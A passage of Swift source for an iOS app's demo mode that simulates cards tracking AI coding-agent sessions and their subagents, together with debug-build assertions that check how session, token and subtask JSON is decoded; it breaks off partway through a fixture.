        var focus = "F"
        /// What the parent itself last said. The card's status and line are
        /// the server's reading of this and the subagents — see `derived`.
        let own: (status: AgentStatus, message: String)
        let kind: Kind
        var items: [(label: String, state: SubtaskState, activity: String)] = []
        /// Finished this turn.
        var done = 0

        /// Minimal mode: a card named by its folder, and subagents numbered
        /// from 3, two having finished before them.
        var minimal: Bool { kind == .minimal }
        var firstN: Int { minimal ? 3 : 1 }
        /// The parent's turn is over: `done`, or `idle` for a card a subagent
        /// made.
        var ownEnded: Bool { own.status == .done || own.status == .idle }
    }

    /// The board the launch asked for, when it asked for a subagent one.
    static var subtaskScenario: SubtaskBoard? {
        switch scenario {
        case .subtasks:
            SubtaskBoard(own: (.coding, "Editing SessionCardView.swift"), kind: .agent, items: [
                ("Run the migration tests", .testing, "Run the store migration tests"),
                ("Draft release notes", .coding, "Writing RELEASE-1.6.4.md"),
            ])
        case .subtasksTen:
            SubtaskBoard(own: (.planning, "Running the review-and-verify workflow"), kind: .workflow,
                         items: review, done: 15)
        case .subtasksThirty:
            SubtaskBoard(own: (.coding, "Editing BoardLayout.swift"), kind: .workflow,
                         items: thirty, done: 64 + 71 + 42 + 9)
        case .subtasksBlocked:
            SubtaskBoard(own: (.planning, "Running the review-and-verify workflow"), kind: .workflow,
                         items: review.map {
                             $0.label != "verify:hook" ? $0
                                 : (label: $0.label, state: SubtaskState.blocked, activity: "Approve: npm test -- hook")
                         },
                         done: 15)
        case .subtasksFailed:
            SubtaskBoard(own: (.coding, "Editing RELEASE-1.6.4.md"), kind: .agent, items: [
                ("Run the migration tests", .testing, "Run the store migration tests"),
                ("Audit the Android strings", .failed, "Stopped: API error (overloaded)"),
                ("Draft release notes", .coding, "Writing RELEASE-1.6.4.md"),
            ], done: 4)
        case .subtasksFinished:
            SubtaskBoard(own: (.coding, "Editing BoardLayout.swift"), kind: .workflow, done: 12)
        case .subtasksBackground:
            SubtaskBoard(own: (.done, "Turn finished"), kind: .agent, items: [
                ("Watch the Android CI build", .testing, "gh run watch 1841 — 6 of 9 jobs"),
                ("Sweep docs for stale flags", .coding, "Editing docs.html"),
            ], done: 3)
        case .subtasksNested:
            SubtaskBoard(own: (.planning, "Running the implement workflow"), kind: .workflow, items: [
                ("implement:server", .coding, "Editing store.ts"),
                ("implement:ios", .coding, "Editing SessionCardView.swift"),
                // Started by implement:server, two levels down. Listed flat.
                ("Find every Focus call site", .planning, "Search listener for focus calls"),
                ("implement:web", .coding, "Editing app.js"),
            ], done: 18 + 6)
        case .subtasksMinimal:
            SubtaskBoard(own: (.coding, "Edit"), kind: .minimal, items: [
                ("Subagent 3", .testing, "Bash"),
                ("Subagent 4", .coding, "Edit"),
                ("Subagent 5", .planning, "WebFetch"),
                ("Subagent 6", .coding, "Write"),
            ], done: 2)
        case .subtasksCodex:
            SubtaskBoard(focus: "X", own: (.coding, "Editing merge.rs"), kind: .codex, items: [
                ("Feynman", .testing, "cargo test -p indexer"),
                ("Noether", .coding, "Editing shard.rs"),
                ("Hypatia", .planning, "Reading docs.rs"),
            ], done: 2)
        case .subtasksLong:
            // Agent-tool descriptions at their real lengths on the owner's
            // Mac: 52 characters is the p90, 23 the median.
            SubtaskBoard(own: (.coding, "Editing listener.ts"), kind: .agent, items: [
                ("Find why the listener reinstall leaves Focus stopped", .planning,
                 "Search listener.ts for reinstall paths"),
                ("Run the migration tests", .testing, "Run the store migration tests"),
                ("Check the Codex rollout schema for sub-agent ids", .planning,
                 "Reading developers.openai.com"),
            ], done: 2)
        case .demo, .busy, .lopsided, .solo, .three, .threeLimits, .long, .empty:
            nil
        }
    }

    /// The prototype's `REVIEW`: a review-and-verify workflow, ten at once.
    private static let review: [(label: String, state: SubtaskState, activity: String)] = [
        ("review:hook", .testing, "Run hook tests with --no-file-parallelism"),
        ("review:listener", .coding, "Editing listener.ts"),
        ("review:product", .planning, "Searching: SubagentStop payload fields"),
        ("review:server", .coding, "Editing store.ts"),
        ("review:ios", .coding, "Editing SessionCardView.swift"),
        ("review:android", .planning, "Reading developer.android.com"),
        ("verify:hook", .testing, "Run the hook suite — 214 tests"),
        ("verify:server", .testing, "npm test -- store"),
        ("verify:web", .coding, "Editing card.css"),
        ("verify:privacy", .planning, "Search payloads for prompt text"),
    ]

    /// The prototype's `THIRTY`: a session at its peak on the owner's Mac,
    /// across four workflows and the Agent tool.
    private static let thirty: [(label: String, state: SubtaskState, activity: String)] = [
        ("implement:server", .coding, "Editing store.ts"),
        ("implement:hook", .coding, "Editing agstatus-hook.js"),
        ("implement:ios", .coding, "Editing SessionCardView.swift"),
        ("implement:android", .coding, "Editing SessionCard.kt"),
        ("implement:web", .coding, "Editing card.css"),
        ("implement:docs", .coding, "Editing docs.html"),
        ("test:server", .testing, "npm test -- store"),
        ("test:hook", .testing, "Run hook tests — 214 passed"),
        ("test:ios", .testing, "xcodebuild test -scheme AgStatus"),
        ("test:android", .testing, "./gradlew testDebugUnitTest"),
        ("review:server", .planning, "Search store.ts for agent_id"),
        ("review:hook", .planning, "Reading code.claude.com"),
        ("review:ios", .coding, "Editing BoardView.swift"),
        ("review:android", .planning, "Search for SessionCard usages"),
        ("review:web", .planning, "Search app.js for paint()"),
        ("review:privacy", .planning, "Search payloads for prompt text"),
        ("verify:server", .testing, "Run the e2e suite"),
        ("verify:hook", .testing, "Run the payload fixtures"),
        ("verify:ios", .testing, "Snapshot the card at three widths"),
        ("verify:android", .testing, "Run the screenshot tests"),
        ("verify:web", .testing, "Run the card fixtures"),
        ("verify:migration", .testing, "Run the migration on a copy"),
        ("Map the SubagentStart payload", .planning, "Searching: SubagentStart agent_type"),
        ("Check the Codex rollout schema", .planning, "Reading github.com"),
        ("Draft the 1.7 release notes", .coding, "Writing RELEASE-1.7.0.md"),
        ("Audit push copy for subtasks", .coding, "Editing NotificationManager.swift"),
        ("map:sizing", .planning, "Count subagents per session"),
        ("map:limits", .planning, "Search for the webhook budget"),
        ("map:minimal", .planning, "Search the hook for MINIMAL"),
        ("map:codex", .planning, "Reading developers.openai.com"),
    ]

    /// The prototype's `BASE`: an ordinary board, so the eye goes to the one
    /// card being judged. Claude sessions carry titles, as they do since
    /// 1.6.1; Codex sessions are never titled and keep their folder names.
    private static func subtaskBoard(_ board: SubtaskBoard, now: Int64) -> [Session] {
        func host(_ machine: Host.Machine) -> Host {
            Host(machine: machine, app: Host.App(slug: "agterm", name: "agterm", kind: "terminal"))
        }
        func card(_ id: String, _ source: String, _ name: String, _ status: AgentStatus, _ message: String,
                  age: Int64, machine: Host.Machine, project: String? = nil, tokens: Int64) -> Session {
            Session(id: id, name: name, status: status, message: message, project: project ?? name,
                    source: source, createdAt: now - (age + 40 * 60) * 1000, updatedAt: now - age * 1000,
                    host: host(machine), tokens: tokens)
        }
        let base = [
            card("F", "claude", "Session organization by agent", .coding, "Editing BoardLayout.swift",
                 age: 10, machine: laptopMachine, project: "claude-status", tokens: 1_100_000),
            card("L", "claude", "Fix listener reinstall leaving Focus stopped", .testing,
                 "Run the listener test suite", age: 70, machine: studioMachine, project: "claude-status",
                 tokens: 912_400),
            card("P", "claude", "Plan the push-token migration", .planning, "Searching: APNs token rotation",
                 age: 300, machine: onlineMachine, project: "acme-ios", tokens: 88_100),
            card("R", "claude", "Release notes for 1.6.3", .done, "Turn finished",
                 age: 1860, machine: studioMachine, project: "claude-status", tokens: 220_500),
            card("land", "codex", "landing", .coding, "Editing pricing.tsx",
                 age: 20, machine: onlineMachine, tokens: 312_700),
            card("sdk", "codex", "sdk-python", .testing, "pytest -k retry",
                 age: 120, machine: studioMachine, tokens: 540_300),
            card("X", "codex", "search-indexer", .testing, "cargo test — 212 passed",
                 age: 200, machine: studioMachine, tokens: 2_100_000),
        ]
        let items = board.items.enumerated().map { index, item in
            Subtask(id: "k\(board.firstN + index)", n: board.firstN + index, label: item.label,
                    state: item.state, activity: item.activity)
        }
        return base.map { session in
            guard session.id == board.focus else { return session }
            var focus = session
            // "just now", and so first in its agent's section.
            focus.updatedAt = now - 5_000
            if board.minimal {
                // Minimal mode sends no titles: the card is its folder's name.
                focus.name = "claude-status"
                focus.project = "claude-status"
            }
            return withSubtasks(focus, items: items, done: board.done, on: board)
        }
    }

    /// `session` carrying these subagents, read as the server reads them:
    /// the card's status and line derived from its own reading and theirs,
    /// and the block shown only where the server would show it.
    private static func withSubtasks(_ session: Session, items: [Subtask], done: Int,
                                     on board: SubtaskBoard) -> Session {
        var next = session
        let reading = derived(own: board.own, items: items)
        next.status = reading.status
        next.message = reading.message
        let live = items.contains { $0.state != .failed }
        let shown = !items.isEmpty || (done > 0 && !board.ownEnded)
        next.subtasks = shown
            ? Subtasks(items: items, done: done, turnEnded: board.ownEnded && live)
            : nil
        return next
    }

    /// The server's reading of a card with subagents (spec §4.5): a blocked
    /// one turns the card blocked unless the parent is itself; after the
    /// turn, the busiest state and "N subagents still running"; otherwise the
    /// parent's own. The demo has no server, so it has to say this itself.
    static func derived(own: (status: AgentStatus, message: String),
                        items: [Subtask]) -> (status: AgentStatus, message: String) {
        let live = items.filter { $0.state != .failed }
        let blocked = live.filter { $0.state == .blocked }
        let working = live.filter(\.state.isWorking)
        if own.status != .blocked, let first = blocked.first {
            return (.blocked, "Needs approval: \(first.label)" + (blocked.count > 1 ? " +\(blocked.count - 1)" : ""))
        }
        if own.status == .done || own.status == .idle, !working.isEmpty {
            let busiest: AgentStatus = working.contains { $0.state == .testing } ? .testing
                : working.contains { $0.state == .coding } ? .coding : .planning
            let count = working.count
            return (busiest, "\(count) subagent\(count == 1 ? "" : "s") still running")
        }
        return own
    }

    /// What a tick starts, by whose subagents they are — the prototype's
    /// `STARTS`.
    private static func starts(_ kind: SubtaskBoard.Kind) -> [(label: String, state: SubtaskState, activity: String)] {
        switch kind {
        case .agent:
            [("Check the Android build", .testing, "Run ./gradlew assembleDebug"),
             ("Summarize the hook diff", .planning, "Searching: SubagentStop")]
        case .workflow:
            [("verify:android", .testing, "Run ./gradlew lint"), ("verify:docs", .coding, "Editing docs.html")]
        case .minimal:
            [("", .testing, "Bash"), ("", .coding, "Edit")]
        case .codex:
            [("Lovelace", .coding, "Editing shard.rs"), ("Turing", .testing, "cargo test -p merge")]
        }
    }

    /// The card with subagents, a tick on: one starts, one finishes, or one is
    /// blocked — or let go, if one already is. Those are what move a row, and
    /// nothing else about them changes here. A subagent also posts what it is
    /// doing within its state, at most once a minute, but that is written in
    /// place and moves nothing. After its turn a parent starts nothing, and
    /// Codex never runs more than three.
    private static func advanceSubtasks(_ session: Session, on board: SubtaskBoard, at now: Int64) -> Session {
        guard let subtasks = session.subtasks else { return session }
        var items = subtasks.items
        var done = subtasks.done
        let canStart = !board.ownEnded && (board.kind != .codex || items.count < 3)
        let working = items.indices.filter { items[$0].state.isWorking }
        let blocked = items.firstIndex { $0.state == .blocked }

        switch Int.random(in: canStart ? 0...2 : 1...2) {
        case 0:
            let n = nextOrdinal(items: items, done: done)
            let start = starts(board.kind)[n % 2]
            items.append(Subtask(id: "k\(n)", n: n, label: start.label.isEmpty ? "Subagent \(n)" : start.label,
                                 state: start.state, activity: start.activity))
        case 1 where !working.isEmpty:
            if let index = working.randomElement() {
                items.remove(at: index)
                done += 1
            }
        default:
            if let blocked {
                items[blocked].state = .testing
                items[blocked].activity = board.minimal ? "Bash" : "Run the suite — 214 passed"
            } else if let index = working.last {
                items[index].state = .blocked
                items[index].activity = board.minimal ? "Needs approval"
                    : board.kind == .codex ? "Approve: cargo publish --dry-run"
                    : "Claude needs your permission to use Bash"
            }
        }
        var next = withSubtasks(session, items: items, done: done, on: board)
        next.updatedAt = now
        return next
    }

    /// The ordinal a tick gives the subagent it starts: one past every
    /// subagent this turn has started, the finished ones included, as the
    /// server's `nextN` is — so never the number of one that has just
    /// finished. Taken from the rows on show alone, Subagent 6 finishing
    /// handed its "Subagent 6", and its id, to the next one to start. A start
    /// adds one to `done + items.count` and a finish moves one across it, so
    /// the sum only climbs.
    private static func nextOrdinal(items: [Subtask], done: Int) -> Int {
        max(items.map(\.n).max() ?? 0, done + items.count) + 1
    }

    /// The prototype's `TIMELINE` for the card being judged: its own history,
    /// newest first, after the reading it is in now — which is the wire's,
    /// so it can read `testing · 2 subagents still running` under a WORKING
    /// capsule, as a real timeline does.
    private static func subtaskTimeline(for session: Session) -> [HistoryEvent] {
        let steps: [(AgentStatus, String, Int64)] = [
            (.idle, "Session started", 26),
            (.planning, "Plan subtasks on session cards", 25),
            (.testing, "Run the board layout tests — 46 passed", 8),
            (.coding, "Editing BoardLayout.swift", 3),
        ]
        var events = steps.enumerated().map { index, step in
            HistoryEvent(seq: Int64(index), status: step.0, message: step.1,
                         at: session.updatedAt - step.2 * 60_000)
        }
        events.append(HistoryEvent(seq: Int64(steps.count), status: session.status, message: session.message,
                                   at: session.updatedAt))
        return events.reversed()
    }
    #endif

    // MARK: Decoding checks

    #if DEBUG
    /// The project has no unit-test target, so the Focus wire models are
    /// checked here, when demo mode starts in a debug build: a null, absent
    /// or malformed host leaves `host == nil` (never a dropped card), an
    /// unknown enum value is kept as `.other` rather than failing the frame,
    /// and a session survives an encode/decode round trip.
    static func verifyFocusDecoding() {
        let decoder = JSONDecoder()
        func session(_ json: String) -> Session? {
            try? decoder.decode(Session.self, from: Data(json.utf8))
        }

        // host: null / absent / not an object / no machine / blank id → nil.
        assert(session(#"{"id":"s","host":null}"#)?.host == nil, "null host")
        assert(session(#"{"id":"s"}"#)?.host == nil, "absent host")
        assert(session(#"{"id":"s","host":"agterm"}"#)?.host == nil, "string host")
        assert(session(#"{"id":"s","host":{"app":{"slug":"agterm"}}}"#)?.host == nil, "host without machine")
        assert(session(#"{"id":"s","host":{"machine":{"id":""}}}"#)?.host == nil, "blank machine id")
        assert(session(#"{"id":"s","host":null}"#) != nil, "the card itself still decodes")

        // A full host, and one with only the machine id.
        let full = session(#"{"id":"s","host":{"machine":{"id":"9f2c","name":"Mac"},"app":{"slug":"agterm","name":"agterm","kind":"terminal"}}}"#)
        assert(full?.host == Host(machine: Host.Machine(id: "9f2c", name: "Mac"),
                                  app: Host.App(slug: "agterm", name: "agterm", kind: "terminal")),
               "full host")
        let bare = session(#"{"id":"s","host":{"machine":{"id":"9f2c"}}}"#)?.host
        assert(bare?.machine.name == "" && bare?.app.slug == "other" && bare?.app.kind == "unknown",
               "bare host defaults")

        // Round trip: what we encode decodes to the same session.
        if let full, let data = try? JSONEncoder().encode(full) {
            assert((try? decoder.decode(Session.self, from: data)) == full, "host round trip")
        } else {
            assertionFailure("session encode")
        }

        // Presence: an offline frame has no name; timestamps may be floats.
        let frames = try? decoder.decode(
            [MachinePresence].self,
            from: Data(#"[{"id":"a","name":"Mac","online":true,"since":1},{"id":"b","online":false,"lastSeen":5.0}]"#.utf8))
        assert(frames?.count == 2 && frames?[0].online == true && frames?[0].name == "Mac", "online frame")
        assert(frames?[1].online == false && frames?[1].name == nil && frames?[1].lastSeen == 5, "offline frame")

        // Acks: known enums map, unknown ones are kept, nulls are nil.
        let known = try? decoder.decode(
            CommandAck.self,
            from: Data(#"{"id":"c","session_id":"s","machine_id":"m","type":"focus","result":"failed","reach":null,"reason":"not-running"}"#.utf8))
        assert(known?.result == .failed && known?.reach == nil && known?.reason == .notRunning, "known ack")
        let unknown = try? decoder.decode(
            CommandAck.self,
            from: Data(#"{"id":"c","session_id":"s","type":"warp","result":"levitated","reach":"orbit","reason":"gremlins"}"#.utf8))
        assert(unknown?.type == .other("warp") && unknown?.result == .other("levitated"), "unknown ack values")
        assert(unknown?.reach == .other("orbit") && unknown?.reason == .other("gremlins"), "unknown ack values")
        assert(unknown?.reason?.rawValue == "gremlins" && CommandReason.appNotRunning.rawValue == "app-not-running",
               "raw values")
        assert(CommandReason(rawValue: "app-not-running") == .appNotRunning, "wire names")

        // Command status: state enum with the same tolerance; the receipt defaults to delivered.
        let status = try? decoder.decode(
            CommandStatus.self,
            from: Data(#"{"id":"c","state":"done","result":"focused","reach":"pane","reason":null}"#.utf8))
        assert(status?.state == .done && status?.result == .focused && status?.reach == .pane, "status")
        assert((try? decoder.decode(CommandStatus.self, from: Data(#"{"id":"c","state":"warped"}"#.utf8)))?.state
               == .other("warped"), "unknown state")
        let receipt = try? decoder.decode(CommandReceipt.self, from: Data(#"{"id":"c"}"#.utf8))
        assert(receipt?.delivered == true, "receipt default")
        assert((try? decoder.decode(CommandReceipt.self, from: Data(#"{"id":"c","delivered":false}"#.utf8)))?.delivered
               == false, "receipt false")
    }

    /// The `tokens` contract, checked alongside the Focus models when demo mode
    /// starts in a debug build.
    ///
    /// Absence is what these guard. The server omits the key entirely whenever
    /// it has no figure — reporting off, a third-party agent, nothing heard
    /// yet, a total aged out — and a client that quietly turned that into 0
    /// would tell the owner a session that has been running all evening spent
    /// nothing. Everything else here is the tolerance the rest of this file
    /// already insists on: one odd value must never cost a whole card.
    static func verifyTokenDecoding() {
        let decoder = JSONDecoder()
        func session(_ json: String) -> Session? {
            try? decoder.decode(Session.self, from: Data(json.utf8))
        }

        // Absent / null / wrong type / negative → no figure, and the card still decodes.
        assert(session(#"{"id":"s"}"#)?.tokens == nil, "absent tokens")
        assert(session(#"{"id":"s","tokens":null}"#)?.tokens == nil, "null tokens")
        assert(session(#"{"id":"s","tokens":"48200"}"#)?.tokens == nil, "string tokens")
        assert(session(#"{"id":"s","tokens":-5}"#)?.tokens == nil, "negative tokens")
        assert(session(#"{"id":"s","tokens":"48200"}"#) != nil, "the card itself still decodes")

        // Zero is a REPORTED figure, not the absent case.
        assert(session(#"{"id":"s","tokens":0}"#)?.tokens == 0, "zero is a figure")
        // JavaScript emits both number shapes.
        assert(session(#"{"id":"s","tokens":48200}"#)?.tokens == 48_200, "integer tokens")
        assert(session(#"{"id":"s","tokens":48200.0}"#)?.tokens == 48_200, "float tokens")

        // A session with no figure encodes without the key, so a round trip
        // through this client cannot turn "unknown" into "zero" either.
        if let bare = session(#"{"id":"s"}"#), let data = try? JSONEncoder().encode(bare) {
            assert(!String(decoding: data, as: UTF8.self).contains("tokens"), "absent tokens stay absent")
        } else {
            assertionFailure("session encode")
        }

        // Glance formatting: one decimal from a thousand up, a raw count below
        // it, and never a unit the reader has to convert themselves.
        assert(Session.tokensLabel(for: 0) == "0", "zero")
        assert(Session.tokensLabel(for: 907) == "907", "below a thousand")
        assert(Session.tokensLabel(for: 48_200) == "48.2K", "thousands")
        assert(Session.tokensLabel(for: 486_200) == "486.2K", "hundreds of thousands")
        assert(Session.tokensLabel(for: 999_999) == "1.0M", "never 1000.0K")
        assert(Session.tokensLabel(for: 1_438_000) == "1.4M", "millions")
        assert(Session.tokensLabel(for: 999_999_999) == "1.0B", "never 1000.0M")
        assert(Session(id: "s", name: "", status: .idle, message: "", project: "",
                       createdAt: 0, updatedAt: 0).tokensLabel == nil, "no figure, no label")
    }

    /// The `subtasks` contract and the readings made from it, checked beside
    /// the decoders above when demo mode starts in a debug build.
    ///
    /// The tolerance is what these guard. A snapshot is one array: a throw
    /// from any card's subagents would drop the whole board, so a malformed
    /// block is no block, a malformed item costs that item alone, and a state
    /// or a count this build cannot read falls back rather than failing. The
    /// Android client's ApiParsingTest carries the same cases.
    static func verifySubtaskDecoding() {
        let decoder = JSONDecoder()
        func session(_ json: String) -> Session? {
            try? decoder.decode(Session.self, from: Data(json.utf8))
        }
        let a = #"{"id":"3f9c1e07b2d4a85c6e1f0a92","n":3,"label":"review:hook","state":"testing","activity":"Run hook tests"}"#
        let b = #"{"id":"a0d5b8e1c2f34a6b7d8e9f01","n":4,"label":"review:listener","state":"coding","activity":"Editing listener.ts"}"#
        let c = #"{"id":"9b2e7c4d1a0f3e5b6c8d7a90","n":9,"label":"verify:hook","state":"blocked","activity":"Approve: Run the hook suite"}"#

        // Absent, null, a string, a number, an array, or an empty block: no
        // block, and the card itself still decodes as today's card.
        for raw in [#"{"id":"s"}"#, #"{"id":"s","subtasks":null}"#, #"{"id":"s","subtasks":"x"}"#,
                    #"{"id":"s","subtasks":7}"#, #"{"id":"s","subtasks":[]}"#,
                    #"{"id":"s","subtasks":{"items":[],"done":0}}"#, #"{"id":"s","subtasks":{}}"#] {
            assert(session(raw) != nil, "the card decodes: \(raw)")
            assert(session(raw)?.subtasks == nil, "no block: \(raw)")
        }

        // The spec's example, whole.
        let full = session(#"{"id":"s","status":"blocked","message":"Needs approval: verify:hook","subtasks":{"turnEnded":false,"running":9,"blocked":1,"failed":0,"done":15,"items":[\#(a),\#(b),\#(c)]}}"#)
        assert(full?.subtasks?.items.map(\.n) == [3, 4, 9], "items in start order")
        assert(full?.subtasks?.running == 9 && full?.subtasks?.blocked == 1 && full?.subtasks?.done == 15,
               "counts are the server's, not the items'")
        assert(full?.subtasks?.items.last == Subtask(id: "9b2e7c4d1a0f3e5b6c8d7a90", n: 9, label: "verify:hook",
                                                     state: .blocked, activity: "Approve: Run the hook suite"),
               "an item, field by field")

        // A malformed item costs that item and no other: no id, a blank id, an
        // id the server could not send, no ordinal, ordinal 0, a fractional
        // one, not an object at all.
        let bad = [#"{"n":2,"label":"x"}"#, #"{"id":"","n":2}"#, #"{"id":"has space","n":2}"#,
                   #"{"id":"\#(String(repeating: "a", count: 65))","n":2}"#, #"{"id":"k1"}"#,
                   #"{"id":"k2","n":0}"#, #"{"id":"k3","n":2.5}"#, #""string""#, "7", "null", "[]"]
        let mixed = session(#"{"id":"s","subtasks":{"done":1,"items":[\#(a),\#(bad.joined(separator: ",")),\#(b)]}}"#)
        assert(mixed?.subtasks?.items.map(\.n) == [3, 4], "bad items dropped, good ones kept")
        // Missing counts are derived from what survived; `done` is the one
        // the items cannot say, and falls back to nothing finished.
        let derivedCounts = session(#"{"id":"s","subtasks":{"items":[\#(a),\#(b),\#(c)]}}"#)?.subtasks
        assert(derivedCounts?.running == 2 && derivedCounts?.blocked == 1 && derivedCounts?.failed == 0
               && derivedCounts?.done == 0 && derivedCounts?.turnEnded == false, "missing counts derived")
        let malformedCounts = session(#"{"id":"s","subtasks":{"running":"9","blocked":-1,"failed":1.5,"done":"x","turnEnded":"yes","items":[\#(a),\#(c)]}}"#)?.subtasks
        assert(malformedCounts?.running == 1 && malformedCounts?.blocked == 1 && malformedCounts?.failed == 0
               && malformedCounts?.done == 0 && malformedCounts?.turnEnded == false, "malformed counts derived")
        // Integral floats are counts like any other, as JavaScript sends them.
        assert(session(#"{"id":"s","subtasks":{"done":12.0,"items":[]}}"#)?.subtasks?.done == 12, "float counts")

        // An unknown state is planning, and the row is kept; a missing label
        // is the server's own "Subagent N"; a missing activity is none.
        let lenient = session(#"{"id":"s","subtasks":{"items":[{"id":"k7","n":7,"state":"researching"},{"id":"k8","n":8,"label":"","state":5}]}}"#)?.subtasks
        assert(lenient?.items.map(\.state) == [.planning, .planning], "unknown states are planning")
        assert(lenient?.items.map(\.label) == ["Subagent 7", "Subagent 8"], "no label is Subagent N")
        assert(lenient?.items.allSatisfy { $0.activity.isEmpty } == true, "no activity is none")
        assert(lenient?.running == 2, "and they count as running")
        // The same subagent twice is one row.
        assert(session(#"{"id":"s","subtasks":{"items":[\#(a),\#(a)]}}"#)?.subtasks?.items.count == 1, "duplicates")
        // Only finished ones: the count-only block still shows.
        assert(session(#"{"id":"s","subtasks":{"items":[],"done":12}}"#)?.subtasks?.done == 12, "count only")

        // A snapshot whose cards carry one bad item each, and one card whose
        // block is garbage, still yields every card.
        let snapshot = try? decoder.decode([Session].self, from: Data(#"""
            [{"id":"one","subtasks":{"items":[\#(a),{"n":1}]}},
             {"id":"two","subtasks":"garbage"},
             {"id":"three","subtasks":{"items":[7,\#(c)],"done":2}}]
            """#.utf8))
        assert(snapshot?.map(\.id) == ["one", "two", "three"], "the snapshot survives")
        assert(snapshot?.map { $0.subtasks?.items.count ?? -1 } == [1, -1, 1], "each card keeps its good items")

        // Round trip: what this client encodes decodes to the same session,
        // and a card with no block encodes without the key.
        if let full, let data = try? JSONEncoder().encode(full) {
            assert((try? decoder.decode(Session.self, from: data)) == full, "subtasks round trip")
        } else {
            assertionFailure("session encode")
        }
        if let bare = session(#"{"id":"s"}"#), let data = try? JSONEncoder().encode(bare) {
            assert(!String(decoding: data, as: UTF8.self).contains("subtasks"), "no block stays absent")
        }

        // The card's reading. WORKING only while the turn is over, a subagent
        // works, and the card is not blocked — blocked outranks it.
        func card(_ status: AgentStatus, turnEnded: Bool, items: [SubtaskState]) -> Session {
            let subtasks = Subtasks(items: items.enumerated().map {
                Subtask(id: "k\($0.offset + 1)", n: $0.offset + 1, label: "x", state: $0.element, activity: "")
            }, done: 0, turnEnded: turnEnded)
            return Session(id: "s", name: "s", status: status, message: "", project: "",
                           createdAt: 0, updatedAt: 0, subtasks: subtasks)
        }
        let plain = Session(id: "s", name: "s", status: .coding, message: "", project: "", createdAt: 0, updatedAt: 0)
        assert(plain.displayStatus == .coding && !plain.isStaleExempt, "no subagents: the status as sent")
        let readings: [(Session, DisplayStatus, Bool)] = [
            (card(.testing, turnEnded: true, items: [.testing, .coding]), .working, true),
            (card(.coding, turnEnded: false, items: [.coding]), .coding, true),
            (card(.blocked, turnEnded: true, items: [.blocked, .coding]), .blocked, true),
            (card(.blocked, turnEnded: false, items: [.blocked]), .blocked, false),
            (card(.done, turnEnded: false, items: [.failed]), .done, false),
            (card(.planning, turnEnded: false, items: []), .planning, false),
        ]
        for (index, row) in readings.enumerated() {
            assert(row.0.displayStatus == row.1, "display status, row \(index)")
            // Stale is never applied while a subagent runs: it can work in
            // silence for minutes, and the server is the judge of that.
            assert(row.0.isStaleExempt == row.2, "stale exemption, row \(index)")
        }
        assert(DisplayStatus.working.isActive && DisplayStatus.coding.isActive && !DisplayStatus.done.isActive,
               "working is an active reading")
        assert(DisplayStatus.allCases.compactMap(\.agentStatus) == AgentStatus.allCases, "six of seven are the wire's")
        assert(Theme.symbol(for: DisplayStatus.working) == "arrow.triangle.branch"
               && Theme.symbol(for: DisplayStatus.blocked) == Theme.symbol(for: AgentStatus.blocked), "marks")
        assert(Theme.symbol(for: SubtaskState.failed) == "xmark.circle", "failed's mark")

        // The demo's own derivation agrees with the server's rule.
        let two = [Subtask(id: "k1", n: 1, label: "verify:hook", state: .blocked, activity: ""),
                   Subtask(id: "k2", n: 2, label: "b", state: .blocked, activity: ""),
                   Subtask(id: "k3", n: 3, label: "c", state: .testing, activity: "")]
        assert(derived(own: (.coding, "x"), items: two) == (.blocked, "Needs approval: verify:hook +1"), "blocked")
        assert(derived(own: (.blocked, "Needs input"), items: two) == (.blocked, "Needs input"), "own block kept")
        assert(derived(own: (.done, "Turn finished"), items: [two[2]]) == (.testing, "1 subagent still running"),
               "after the turn")
        assert(derived(own: (.coding, "x"), items: [two[2]]) == (.coding, "x"), "own reading")

        // Nor does it hand out an ordinal twice, which the server never does:
        // with minimal mode's Subagent 6 just finished, the next is 7.
        func listed(_ ordinals: [Int]) -> [Subtask] {
            ordinals.map { Subtask(id: "k\($0)", n: $0, label: "Subagent \($0)", state: .coding, activity: "") }
        }
        assert(nextOrdinal(items: listed([3, 4, 5, 6]), done: 2) == 7, "minimal: after the four on show")
        assert(nextOrdinal(items: listed([3, 4, 5]), done: 3) == 7, "the highest just finished: not its number")
        assert(nextOrdinal(items: listed(Array(1...10)), done: 15) == 26, "past the finished ones too")
        assert(nextOrdinal(items: [], done: 12) == 13, "every row finished")
        assert(nextOrdinal(items: listed([1, 2]), done: 0) == 3, "nothing finished yet")
    }

    /// The `subtasks` contract against the server itself, checked beside
    /// `verifySubtaskDecoding` when demo mode starts in a debug build.
    ///
    /// That table holds this client to the spec; this one holds it to what a
    /// 1.7 server actually sends. The sessions below are the snapshot frame
    /// of `GET /events` from the merged 1.7 server, seeded with the hook's own
    /// rules: a workflow of ten and one of thirty, one subagent waiting on
    /// approval and then two, a failure, every row finished, the turn over
    /// with two still working, the report hold, minimal mode, Codex, labels
    /// at their real lengths, and a card with no subagents. Joined into one
    /// array they are that frame's data, byte for byte. Each is broken into
    /// lines here only to be read, one subagent to a line, and joined again
    /// before it is decoded.
    static func verifyServerSubtasks() {
        let decoder = JSONDecoder()
        // In the frame's own order, the most recently updated first.
        let frame: [(scenario: String, json: String)] = [
            ("long", #"""
                {"id":"seed-long","name":"Fix listener reinstall leaving Focus stopped","status":"coding","message":"Editing install.ts","project":"claude-status","source":"claude","host":null,"createdAt":1793209331895,"updatedAt":1793209331900,
                "subtasks":{"turnEnded":false,"running":3,"blocked":0,"failed":0,"done":2,"items":[
                {"id":"691024b85fbf8ed1fdc3dab8","n":3,"label":"Find why the listener reinstall leaves Focus stopped","state":"planning","activity":"Searching: launchctl bootstrap leaves the LaunchAgent unloaded after a reinstall"},
                {"id":"fe5c9a2f13b1ec7e17cf7483","n":4,"label":"Run the store migration tests against Postgres 16.15","state":"testing","activity":"Run the store migration tests with --no-file-parallelism against a disposable cl"},
                {"id":"eac87fba0a27afc05409e6d2","n":5,"label":"Check the Codex rollout schema for spawn_agent calls","state":"planning","activity":"Reading developers.openai.com"}]}}
                """#),
            ("codex", #"""
                {"id":"seed-codex","name":"search-indexer","status":"coding","message":"Editing files","project":"search-indexer","source":"codex","host":null,"createdAt":1793209331890,"updatedAt":1793209331895,
                "subtasks":{"turnEnded":false,"running":3,"blocked":0,"failed":0,"done":2,"items":[
                {"id":"eda034f3b538b230c6bd40eb","n":3,"label":"Feynman","state":"testing","activity":"cargo test -p indexer"},
                {"id":"389b9beddd053d3df2cd0c32","n":4,"label":"Noether","state":"coding","activity":"Editing files"},
                {"id":"13fb52e6f6f78f771bfa0c6e","n":5,"label":"Hypatia","state":"planning","activity":""}]}}
                """#),
            ("minimal", #"""
